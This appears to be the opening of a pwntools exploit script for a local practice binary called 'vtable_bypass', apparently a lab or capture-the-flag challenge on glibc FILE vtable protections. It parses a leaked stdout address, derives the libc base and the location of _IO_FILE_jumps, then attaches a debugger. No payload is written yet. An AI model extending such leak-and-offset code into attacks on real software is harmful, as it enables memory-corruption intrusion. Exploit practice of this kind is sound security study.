#!/usr/bin/python
from pwn import *

p = process("./vtable_bypass")
elf = ELF("./vtable_bypass")
libc = elf.libc 

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
log.info("stdout: "+hex(stdout))
libcBase = stdout - libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libcBase + libc.symbols['_IO_FILE_jumps']

gdb.attach(p)

p.interactive()
